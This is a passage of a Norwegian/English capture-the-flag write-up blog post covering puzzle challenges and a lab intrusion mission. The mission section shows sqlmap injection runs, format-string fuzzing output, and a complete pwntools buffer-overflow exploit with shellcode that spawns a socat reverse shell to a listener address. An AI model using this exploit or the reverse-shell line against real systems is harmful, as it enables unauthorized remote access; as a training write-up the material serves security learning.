</code></pre></div></div><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Interviewed Ms. Church at 2:04 pm.  
Witness stated that she did not see anyone she could identify as the shooter, 
that she ran away as soon as the shots were fired.
However, she reports seeing the car that fled the scene.  
Describes it as a blue Honda, with a license plate that starts with "L337" and ends with "9"
</code></pre></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep</span> <span class="nt">-A3</span> <span class="s2">"^License Plate L337.*9$"</span> vehicles | <span class="nb">grep</span> <span class="nt">-A2</span> <span class="s2">"^Make: Honda$"</span> | <span class="nb">grep</span> <span class="nt">-A1</span> <span class="s2">"^Color: Blue$"</span>
</code></pre></div></div><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Owner: Erika Owens
Owner: Aron Pilhofer
Owner: Heather Billings
Owner: Joe Germuska
Owner: Victor Sidney
Owner: Jacqui Maher
Erika Owens     F       56      Trapelo Street, line 98
Aron Pilhofer   M       16      Claybourne Street, line 145
Heather Billings        F       38      Culbert Street, line 19
Joe Germuska    M       65      Plainfield Street, line 275
Victor Sidney   M       34      Dunstable Road, line 284
Jacqui Maher    F       40      Andover Road, line 224
</code></pre></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'98,98p'</span> streets/Trapelo_Street
<span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'145,145p'</span> streets/Claybourne_Street
<span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'19,19p'</span> streets/Culbert_Street
<span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'275,275p'</span> streets/Plainfield_Street
<span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'284,284p'</span> streets/Dunstable_Road
<span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'224,224p'</span> streets/Andover_Road
</code></pre></div></div><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SEE INTERVIEW #5455315
SEE INTERVIEW #1767435
SEE INTERVIEW #2939888
SEE INTERVIEW #29741223
SEE INTERVIEW #9620713
SEE INTERVIEW #904020
</code></pre></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>interviews/interview-5455315
<span class="nb">cat </span>interviews/interview-1767435
<span class="nb">cat </span>interviews/interview-2939888
<span class="nb">cat </span>interviews/interview-29741223
<span class="nb">cat </span>interviews/interview-9620713
<span class="nb">cat </span>interviews/interview-904020
</code></pre></div></div><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Victor Sidney:
Home appears to be empty, no answer at the door.
After questioning neighbors, appears that the occupant may have left for a trip recently.
Considered a suspect until proven otherwise, but would have to eliminate other suspects to confirm.
</code></pre></div></div><p>En rask liten sjekk i membercard registeret viser at Victor Sidney har medlemsskap i alle klubbene, Victor Sidney er morderen.<h3 id="knock-knock">Knock knock</h3><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vi får en video, og kun det.
</code></pre></div></div><p>Det er ikke ut til at det er noe skjulte filer i videoen eller. Videoen er av en dukke som banker på et gjerde, jeg tipper på morsekode så jeg henter ut lyden og dumper den inn i <a href="https://www.audacityteam.org/">audacity</a> for manuell analysering. Det viser seg at det sannsynligvis IKKE er morse, for der ble resultatet bare søppel. Videoen avsluttes med to matematiske konstruksjoner:<p><code class="MathJax_Preview">A = [a_{ij}]_{n,m}</code><script type="math/tex">A = [a_{ij}]_{n,m}</script><br /> <code class="MathJax_Preview">A^T = [a_{ji}]_{m,n}</code><script type="math/tex">A^T = [a_{ji}]_{m,n}</script><p>Dette er en standard måte å definere en matrise og den <a href="https://en.wikipedia.org/wiki/Transpose">transponerte matrisen</a>. Kan hente meldingen ligger skjult i lyden, og ved å transponere, så kan man få ut noe fornuftig? Men det er ikke tilfelle. <a href="https://exiftool.org/">exiftool</a> gir oss litt ekstra informasjon: Filmen er laget vha Adobe Premiere, den ligger i folder kensentme (Ken sent me). Jeg finner ikke ut av noe ekstra med denne informasjonen, men det at filmen heter knock knock, og den har en matrise som avslutning hinter til at det er en <a href="https://en.wikipedia.org/wiki/Tap_code">tap cipher</a>. Ved å registrere taps (lett med audacity) og punche inn i <a href="https://www.dcode.fr/tap-cipher">https://www.dcode.fr/tap-cipher</a> så får vi resultatet: ORDETDULETERETTERERTAPDANCE, altså TAP DANCE.<h3 id="lett---runer">Lett - runer</h3><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Her får vi presentert et bilde an noe som ser ut som runer.
</code></pre></div></div><p><hy-img root-margin="512px" src="/assets/img/blog/2020-etjenesten/runer.png" alt="runer">  <noscript><img data-ignore src="/assets/img/blog/2020-etjenesten/runer.png" alt="runer"/></noscript>  <span slot="loading" class="loading"><span class="icon-cog"></span></span></hy-img><p>Ved å lese litt om runer og futhark, så kan man oversette runene til latinsk alfabet, og vi får dette resultatet:<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AUTFH
NKRRU
IREER
ETENR
TSASN
</code></pre></div></div><p>Første linje leses nesten som futhark, så ved å skyfle litt rundt på kolonnene (42351), så får man en fornuftig setning. futharkrunererinteressant<h3 id="lett---sharing-secrets">Lett - Sharing secrets</h3><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Her får vi en introduksjon til Sharing secrets.
</code></pre></div></div><p>Denne krever at man faktisk kjører et program for å løse, og man finner det man trenger på <a href="https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing">wikipedia</a>. Jeg hadde litt problemer med å løse denne, men det var fordi jeg ikke er noe spesiellt flink til å lese hint. Ved å løse oppgaver, så får man flere og flere secrets tilgjengelig får å løse for k=3, k=4 osv. Etterhvert som oppgaver blir løst, er det bare å gå tilbake til denne, legge inn secrets, få ut svaret og punche inn i scoreboard.<h3 id="middels---artwork">Middels - Artwork</h3><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Her får vi et bilde.
</code></pre></div></div><p><hy-img root-margin="512px" src="/assets/img/blog/2020-etjenesten/dbc6486d9c1788ccce2f4ece3e498fb3.png" alt="Artwork">  <noscript><img data-ignore src="/assets/img/blog/2020-etjenesten/dbc6486d9c1788ccce2f4ece3e498fb3.png" alt="Artwork"/></noscript>  <span slot="loading" class="loading"><span class="icon-cog"></span></span></hy-img> Her måtte jeg få et lite hint som dyttet meg i riktig retning, men ellers så var denne grei. Filnavnet er en hash, som lett kan crackes til “esoteric”. I bildet er det en tekst, “intellect confuses intuition”. Toppen av bildet ser ut til å være akkurat samme som bunnen, bare invertert. fire horisontale linjer, en haug vertikale linjer i forskjellig lengde og farge, pluss en krøll her og der. Steganalyse av bildet gir meg ingenting. Jeg begynte på å finne et mønster for bredde for å se om det kunne være bokstaver som faktisk er enkodet. På dette tidspunkt fikk jeg et hint om å bruke mine ville Google foo skillz, som til slutt sa hva dette bildet faktisk er. Assembled Piet Code. <a href="https://www.bertnase.de/npiet/">https://www.bertnase.de/npiet/</a> <a href="https://www.dangermouse.net/esoteric/piet/samples.html">https://www.dangermouse.net/esoteric/piet/samples.html</a><p>Ved å bruke en <a href="https://www.bertnase.de/npiet/npiet-execute.php">online tjeneste for piet</a>, så fikk vi iallefall noe fornuftig ut.<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Part 1: HAVAL('mondrian')
Part 2: Enter password:
</code></pre></div></div><p>Nok et online tool for HAVAL ga oss korrekt svar på del 1. <a href="http://www.unit-conversion.info/texttools/haval/">http://www.unit-conversion.info/texttools/haval/</a>. For del to så måtte jeg gå litt hardere til verks. Jeg begynte med <a href="https://github.com/Ramblurr/PietCreator">https://github.com/Ramblurr/PietCreator</a> som er et gui for å skrive Piet Programmer, og den fikk lett til å åpne bildet. Ved å leke litt med å bytte ut instruksjoner med NOP så kom jeg endelig fram til hva som skjer etter at man har skrevet inn et passord, og der ser det ut til at en og en bokstav blir sjekket vha litt matematikk. dette programmet var ugruelig ustabilt, så jeg byttet til <a href="https://www.bertnase.de/npiet/">npiet</a>, og aktiverte trace funksjonen for å se hvordan stacken var hvis jeg sendte inn en A som passord. det var meningen at stacken skulle ende opp etter hver bokstav med ett element, men hvis en bokstav var feil så ender stacken opp en to elementer, hvor det ene elementet faktisk er offset fra korrekt bokstav til A. Litt kalkulator og bokstav for bokstav så fikk jeg bygd opp passordet som jeg har glemt å notert ned, men såvidt jeg husker var det Tr0ub4dor&amp;3. Ved å punche inn dette passordet får man correct horse battery stable. Finfin referanse til <a href="https://xkcd.com/936/">xkcd</a>.<h3 id="middels---explosion">Middels - Explosion</h3><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Vi får et binærprogram, hvor vi må reversere for å forstå hvordan dette fungerer.
</code></pre></div></div><p>Nope! Denne tok jeg ikke i det hele tatt.<h2 id="selve-oppdraget">Selve Oppdraget</h2><p>Denne seksjonen blir ikke så veldig strukturert, og sannsynligvis en blanding av norsk og engelsk, for den blir skrevet lenge etter at den ble gjort og notatene mine fra den tiden har rom for forbedringer. Jeg dumper det uansett ut relativt uformattert. 😌<h2 id="situasjon">Situasjon</h2><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Vi har mottatt informasjon om at en ukjent trusselaktør har fått tilgang
til maskiner knyttet til et av våre departementer. Basert på nåværende
situasjonsforståelse er det lite som er kjent om hendelsesforløpet. Trusselen
kommer fra en aktør i utlandet, trolig en aktør med omfattende ressurser.

Initiell analyse tilsier at aktøren eksfiltrerer data til domenet
cloud-c2-70, på port 1337/TCP. Formatet er ukjent.

Det er også observert trafikk knyttet til aktøren mot denne nettadressen:
http://keystore/query.php?keyname=oper@cloud-mgr-15
</code></pre></div></div><h2 id="oppdrag">Oppdrag</h2><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Vi trenger informasjon om trusselaktørens kapabiliteter og intensjon.

Initielt ønsker vi å få vite hvem som lastet opp nøkler til
keystore.

Videre er din oppgave er å få tilgang til serveren cloud-c2-70
og forsøke å avdekke hva som er stjålet i angrepet. Informasjon om
trusselaktørens verktøy, infrastruktur, sertifikater og nøkler kan også
være av interesse.

Viktig: Før du kan sette i gang med oppdraget må du logge ut og
kjøre kommandoen:

────────────────────
$ ssh login@ctf.cybertalent.no START-OPPDRAG
────────────────────

Lykke til!
</code></pre></div></div><h2 id="sql-injection">SQL injection</h2><p>Uploaded sqlmap, and found that the keyname is vulnerable to sql injection.<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 sqlmap.py <span class="nt">-v</span> <span class="nt">-u</span> http://keystore/query.php?keyname<span class="o">=</span>oper@cloud-mgr-15 <span class="nt">--random-agent</span> <span class="nt">--delay</span><span class="o">=</span>5
</code></pre></div></div><p>so, what now? poke around in the db a bit first.<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 sqlmap.py <span class="nt">-v</span> <span class="nt">-u</span> http://keystore/query.php?keyname<span class="o">=</span>oper@cloud-mgr-15 <span class="nt">--random-agent</span> <span class="nt">--delay</span><span class="o">=</span>6 <span class="nt">-bck-end</span> DBMS: MySQL <span class="o">&gt;=</span> 5.0.12
banner: <span class="s1">'8.0.19'</span>

<span class="nt">--current-user</span>
current user: <span class="s1">'keystore@%'</span>

<span class="nt">--current-db</span>
current database: <span class="s1">'keystore'</span>

<span class="nt">--is-dba</span>
False

<span class="nt">--users</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'keystore'</span>@<span class="s1">'%'</span>

<span class="nt">--passwords</span>
No results.

<span class="nt">--privileges</span> 
privilege: USAGE

<span class="nt">--roles</span>
role: USAGE

<span class="nt">--dbs</span>
information_schema
keystore

<span class="nt">-D</span> keystore <span class="nt">--tables</span>
<span class="o">[</span>3 tables]
+-----------------+
| keystore        |
| user_key_upload |
| userstore       |
+-----------------+

<span class="nt">-D</span> keystore <span class="nt">--dump</span>
actual key <span class="nb">id </span>17693
uploaded:  
key_id, user_id, <span class="nb">time
</span>17693,20524,1083438277
user uploaded:
user_id,user_name,user_password
20524,Elliot Alderson,014aedf1bc63277183ae5034c023c8ba
</code></pre></div></div><h2 id="whats-next">Whats next?</h2><p>Vi fikk litt mer informasjon: Vi har indikasjoner på at aktørens kryptonøkkel-generator har en bakdør. Kan du undersøke videre?<p>Her gikk jeg litt i alle retninger før jeg fant ut hvor jeg skulle videre. Litt mer SQL injection. same user has uploaded several keys:<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>12072,20524,1555605348
13941,20524,986626492
14074,20524,1291346859
14347,20524,1410200316
15572,20524,1111329525
15887,20524,1332499533
16048,20524,1026833399
16986,20524,1437342107
17245,20524,1072842646
17462,20524,1529238164
17693,20524,1083438277
18008,20524,1176764506
18358,20524,1236242269
18407,20524,1098316055
18435,20524,1100795486
18456,20524,1111066872
18617,20524,1359818045
18813,20524,1304052798
18876,20524,1237690662
19044,20524,1010123619
19408,20524,959551014
</code></pre></div></div><p>Almost all of them are active. Can this be exploited? Obviously not with my knowledge at this point, but exploration is allowed. 😁 We can probably look closer at <a href="https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54">Upgrade Your SSH Key to Ed25519</a> Looking at RsaCtfTool and RSHack, try to see what we got with our two public keys. <a href="https://github.com/Ganapati/RsaCtfTool">RsaCtfTool</a> <a href="https://github.com/zweisamkeit/RSHack">RSHack</a><p>Starting with cloud-hq-42 Of the keys, these servers are active: cloud-hq-42 ports open: 22 cloud-c2-70<p>Found nothing for RSA, but I have connection to the cloud-c2-70 1337 server. Trying to figure out how this works.<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netcat cloud-c2-70 1337
<span class="o">&gt;</span> <span class="nb">help</span>
/lootd: available commands: <span class="nb">help</span>, upload, download, <span class="nb">uname</span>, <span class="nb">uptime</span>
<span class="o">&gt;</span> tut
./lootd: unknown <span class="nb">command</span>: <span class="s1">'tut'</span>
</code></pre></div></div><p>I fuzzed manually to see if any characters was behaving unormally. download and upload takes parameters, which we can break with segmentation fault.<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%e - ./lootd: unknown <span class="nb">command</span>: <span class="s1">'6.922279e-310'</span>
%u - ./lootd: unknown <span class="nb">command</span>: <span class="s1">'2753872103'</span>
%i - ./lootd: unknown <span class="nb">command</span>: <span class="s1">'-1541095193'</span>
%o - ./lootd: unknown <span class="nb">command</span>: <span class="s1">'24411140347'</span>
%p - ./lootd: unknown <span class="nb">command</span>: <span class="s1">'0x5628a424c0e7'</span>
%a - ./lootd: unknown <span class="nb">command</span>: <span class="s1">'0x1.fdb6326547p-1028'</span>
%d same as %u
%f - ./lootd: unknown <span class="nb">command</span>: <span class="s1">'0.000000'</span>
%g - almost same as %e
%x -  ./lootd: unknown <span class="nb">command</span>: <span class="s1">'12a960e7'</span>
%m - ./lootd: unknown <span class="nb">command</span>: <span class="s1">'Invalid argument/No error information'</span>
%n - goes into another context.
<span class="s1">'%n '</span> - ./lootd SIG#11 Segmentation fault
./lootd: unknown <span class="nb">command</span>: <span class="s1">'
</span></code></pre></div></div><p>I had no idea what to do next, but after some googling: ooooo, a format string vulnerability?<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
./lootd: unknown <span class="nb">command</span>: <span class="s1">'0x55a76b1490e7 0xffffffff 0 0x7fff34c75da8 0 0x7fff34c75ff0 0x55a76b148af6 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x70252070 0 0'</span>
</code></pre></div></div><p>Oh yes, now to figure out how to exploit this, as I have never done something like this before. 🙄 Step by step (and RTFM): <a href="https://www.defcon.org/images/defcon-18/dc-18-presentations/Haas/DEFCON-18-Haas-Adv-Format-String-Attacks.pdf">DEFCON-18-presentation</a> Also check out the youtube videos for these slides. Deep insight: <a href="https://www.win.tue.nl/~aeb/linux/hh/formats-teso.html">Good old paper</a> read documentation for <a href="https://github.com/Gallopsled/pwntools">python pwntools</a> fmtstr Also bought the book <a href="https://www.handsonsecurity.net/">Computer Internet Security</a> Ok, Lets try to write our own exploiter. Start by writing a skeleton that send code to the server first, and retrieve the results. actually trying pwntools, perhaps I cxan learn something new. Seems it’s a buffer overflow, 135 chars is ok, 136 crashes. Back to pwntools. Ok, leaking 64 bit addresses.<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. 0x55d932f4f0e7	<span class="c"># crash for string</span>
2. 0xffffffff		<span class="c"># always ffffffff</span>
3. 0			<span class="c"># always 0</span>
4. 0x7ffc56f968d8	<span class="c"># empty string</span>
5. 0			<span class="c"># always 0</span>
6. 0x7ffc56f96b20	<span class="c"># Pointer to MY string! this is where we will drop our exploit</span>
7. 0x55d932f4eaf6	<span class="c"># "xeb\x11H\x8d=Q\x07" ??</span>
8. 0x70252c70252c7025	<span class="c"># Start of string</span>
9. 0x252c70252c70252c	<span class="c"># string continues</span>
</code></pre></div></div><p>So, by using a leaked stack address from the printf vulnerable code, and the constructing a buffer overflow payload, I was able to the a full blown shell on the server! Mind you, I used better parts of 3-5 days reading, trying something, reading some more, trying some more, before I understood what I had to to, not least actually implement it.<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="c1"># Connect to server
</span><span class="n">c</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'cloud-c2-70'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
<span class="c1"># read until prompt
</span><span class="n">c</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

<span class="c1"># Get the pointer to the start of the buffer, stored in leaked_start
</span><span class="n">probe</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="si">%</span><span class="s">p,'</span><span class="o">*</span><span class="mi">6</span> \
        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="si">%</span><span class="s">p,'</span> \
        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="si">%</span><span class="s">p,'</span><span class="o">*</span><span class="mi">20</span> \
        <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span>
<span class="n">c</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">probe</span><span class="p">)</span>
<span class="n">line</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">leaked_start</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="n">b</span><span class="s">','</span><span class="p">)[</span><span class="mi">5</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Got pointer to start of buffer.'</span><span class="p">)</span>
<span class="c1"># ok now we overflow the buffer
# instead of using a regular padding, we spray the heap with our pointer. we need at least 17 to overflow.
# start with a complete buffer of 400, filled with NOP
</span><span class="n">strSize</span> <span class="o">=</span> <span class="mi">400</span>
<span class="n">numberOfPtr</span> <span class="o">=</span> <span class="mi">21</span>

<span class="n">shellcode</span> <span class="o">=</span><span class="n">b</span><span class="s">"</span><span class="se">\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62</span><span class="s">"</span> \
      <span class="o">+</span> <span class="n">b</span><span class="s">"</span><span class="se">\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31</span><span class="s">"</span> \
      <span class="o">+</span> <span class="n">b</span><span class="s">"</span><span class="se">\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c</span><span class="s">"</span> \
      <span class="o">+</span> <span class="n">b</span><span class="s">"</span><span class="se">\x58\x0f\x05</span><span class="s">"</span>
<span class="n">nopSledSize</span> <span class="o">=</span> <span class="n">strSize</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="p">(</span><span class="n">numberOfPtr</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>
<span class="n">ptr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">leaked_start</span> <span class="o">+</span> <span class="p">(</span><span class="n">numberOfPtr</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nb">int</span><span class="p">(</span><span class="n">nopSledSize</span> <span class="o">/</span> <span class="mi">2</span><span class="p">))</span> <span class="o">*</span> <span class="n">numberOfPtr</span>
<span class="n">send_str</span> <span class="o">=</span> <span class="n">ptr</span> <span class="o">+</span> <span class="p">(</span><span class="n">b</span><span class="s">'</span><span class="se">\x90</span><span class="s">'</span><span class="o">*</span><span class="n">nopSledSize</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Sending buffer overflow'</span><span class="p">)</span>
<span class="n">c</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">send_str</span><span class="p">)</span>
<span class="c1"># at this point, we now have a shell.
# Instead of doing interactive(), we fire up a reverse shell.
# the lootd daemon is started with socat, so we can use socat to get a descent
# reverse shell. do remember to start the reverse shell listener.
# socat file:`tty`,raw,echo=0 tcp-listen:9001
</span><span class="n">c</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Got shell access, spawning reverse shell'</span><span class="p">)</span>
<span class="n">c</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span><span class="s">'socat exec:</span><span class="se">\'</span><span class="s">ash -li</span><span class="se">\'</span><span class="s">,pty,stderr,setsid,sigint,sane tcp:10.0.77.100:9001'</span><span class="p">)</span>
<span class="n">c</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div><p>Interesting enough, by using the command download with parameter lootd we get a hexdump of the actual binary file. I figured out this after I had exploited. I could have used ghidra to reverse the binary and find the vulnerabilities without doing the insane amounts of guesswork I did. Anyway, here is the code to extract the binary from the hexdump to be able to analyse it in ghidra.<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'lootd.txt'</span><span class="p">)</span>
<span class="nb">str</span> <span class="o">=</span> <span class="s">''</span>
<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">file</span><span class="p">:</span>
    <span class="nb">str</span> <span class="o">+=</span> <span class="n">line</span><span class="p">[</span><span class="mi">10</span><span class="p">:</span><span class="mi">58</span><span class="p">]</span>

<span class="n">arr</span> <span class="o">=</span> <span class="nb">str</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)</span>
<span class="nb">bytes</span> <span class="o">=</span> <span class="n">b</span><span class="s">''</span>
<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">arr</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">x</span> <span class="o">==</span> <span class="s">''</span><span class="p">:</span>
        <span class="k">continue</span>
    <span class="nb">bytes</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">'big'</span><span class="p">)</span>

<span class="n">result</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'lootd'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span>
<span class="n">result</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">bytes</span><span class="p">)</span>
<span class="n">result</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div><p>Og her faller writeupen fra hverandre, iom at notatene mine var på en VM som i etterkant har blitt slettet.😪 Jeg hamret iallefall videre og klarte til slutt å komme igjennom hele, en rimelig bratt læringskurve. Flere gode writeups for veien videre, e.g. <a href="https://www.indregard.no/2020/03/e-tjenestens-ctf/">Sigve Indregard</a><h2 id="til-slutt">Til slutt</h2><p>🙌🙌 Takk for at du tok deg tid til å lese alt, trykk på recommend og legg inn en kommentar! 🙌🙌</div></article><hr class="dingbat related" /><aside class="about related mt4 mb4" role="complementary"><div class="author mt4"><h2 class="page-title hr"> About</h2><p>Part time vulnerability, bug and bounty hunter. Enjoy searching for and exploiting vulnerabilities on wargames and ctf’s. Will blog about my adventures in wargames, ctf’s, bounty hunts, vulnerability explorations, both ups and downs. Hopefully you can learn something by reading and subscribing to my blog.<div class="sidebar-social"> <span class="sr-only">Social:</span><ul><li> <a href="https://twitter.com/fjankk" title="Twitter" class="no-mark-external" rel="me"> <span class="icon-twitter"></span> <span class="sr-only">Twitter</span> </a><li> <a href="https://github.com/fjank" title="GitHub" class="no-mark-external" rel="me"> <span class="icon-github"></span> <span class="sr-only">GitHub</span> </a></ul></div></div></aside><aside class="related mb4" role="complementary"><h2 class="hr">Related Posts</h2><ul class="related-posts"><li> <a href="/blog/2020-01-04-pst-chistmas-ctf/" class="h4 flip-title"><span>NPST utlyser en midlertidig stilling som snikende alvebetjent</span></a> <time class="heading faded fine" datetime="2020-01-04T00:00:00+01:00">04 Jan 2020</time><li> <a href="/blog/2019-11-18-adidas-smart-run/" class="h4 flip-title"><span>Adidas Smart Run</span></a> <time class="heading faded fine" datetime="2019-11-18T00:00:00+01:00">18 Nov 2019</time><li> <a href="/blog/2019-03-18-overthewire-natas-10-14/" class="h4 flip-title"><span>OverTheWire natas 10 - 14</span></a> <time class="heading faded fine" datetime="2019-03-18T00:00:00+01:00">18 Mar 2019</time></ul></aside><aside class="comments related" role="complementary"><h2 class="hr">Comments</h2><div id="disqus_thread"></div><noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript> <script>!function(w, d) { if (d.getElementById("disqus_thread")) { if (w.DISQUS) { w.DISQUS.reset({ reload: true, config() { this.page.url = w.location.href; this.page.title = d.title; }, }); } else { w.disqus_config = function disqusConfig() { this.page.url = w.location.href; this.page.title = d.title; }; w.loadJSDeferred(d.getElementById("_hrefDisqus").href + '/embed.js'); } } }(window, document);</script></aside><footer role="contentinfo"><hr/><p><small class="copyright">© 2019. All rights reserved. </small><p><small>Powered by <a class="external" href="https://hydejack.com/">Hydejack</a> v<span id="_version">8.5.2</span></small><hr class="sr-only"/></footer></main><hy-drawer class="" align="left" threshold="10" touch-events prevent-default ><header id="_sidebar" class="sidebar" role="banner"><div class="sidebar-bg sidebar-overlay" style="background-color:rgb(25,55,71);background-image:url(/assets/img/sidebar-bg.jpg)"></div><div class="sidebar-sticky"><div class="sidebar-about"><h2 class="h1"><a href="/">Fjanks security pages</a></h2><p class="fine"> A blog about security, CTF, vulnerabilities, pen-testing and other interesting things that are related to security.</div><nav class="sidebar-nav heading" role="navigation"> <span class="sr-only">Navigation:</span><ul><li> <a id="_navigation" href="/about/" class="sidebar-nav-item" > About </a></ul></nav><div class="sidebar-social"> <span class="sr-only">Social:</span><ul><li> <a href="https://twitter.com/fjankk" title="Twitter" class="no-mark-external" rel="me"> <span class="icon-twitter"></span> <span class="sr-only">Twitter</span> </a><li> <a href="https://github.com/fjank" title="GitHub" class="no-mark-external" rel="me"> <span class="icon-github"></span> <span class="sr-only">GitHub</span> </a></ul></div></div></header></hy-drawer><hr class="sr-only" hidden /> </hy-push-state> <!--[if gt IE 10]><!----> <script nomodule>!function(){var e=document.createElement("script");if(!("noModule"in e)&&"onbeforeload"in e){var t=!1;document.addEventListener("beforeload",function(n){if(n.target===e)t=!0;else if(!n.target.hasAttribute("nomodule")||!t)return;n.preventDefault()},!0),e.type="module",e.src=".",document.head.appendChild(e),e.remove()}}(); </script> <script type="module" src="/assets/js/hydejack-8.5.2.js"></script> <script nomodule src="/assets/js/hydejack-legacy-8.5.2.js" defer></script> <script>!function(w, d) { w.ga=w.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date; /**/ ga('create', 'UA-136398928-1', 'auto'); /**/ var pushStateEl = d.getElementsByTagName('hy-push-state')[0]; var timeoutId; pushStateEl.addEventListener('hy-push-state-load', function() { w.clearTimeout(timeoutId); timeoutId = w.setTimeout(function() { ga('set', 'page', w.location.pathname); ga('send', 'pageview'); }, 500); }); d.addEventListener('hy--cookies-ok', function () { w.ga(function(tracker) { w.ga("set", "anonymizeIp", undefined); localStorage && localStorage.setItem("ga--client-id", tracker.get("clientId")); }); }); w.loadJSDeferred('https://www.google-analytics.com/analytics.js'); }(window, document);</script> <!--<![endif]--><h2 class="sr-only" hidden>Templates (for web app):</h2><template id="_animation-template" hidden><div class="animation-main fixed-top"><div class="content"><div class="page"></div></div></div></template> <template id="_loading-template" hidden><div class="loading nav-btn fr"> <span class="sr-only">Loading…</span> <span class="icon-cog"></span></div></template> <template id="_error-template" hidden><div class="page"><h1 class="page-title">Error</h1><p class="lead"> Sorry, an error occurred while loading <a class="this-link" href=""></a>.</div></template> <template id="_forward-template" 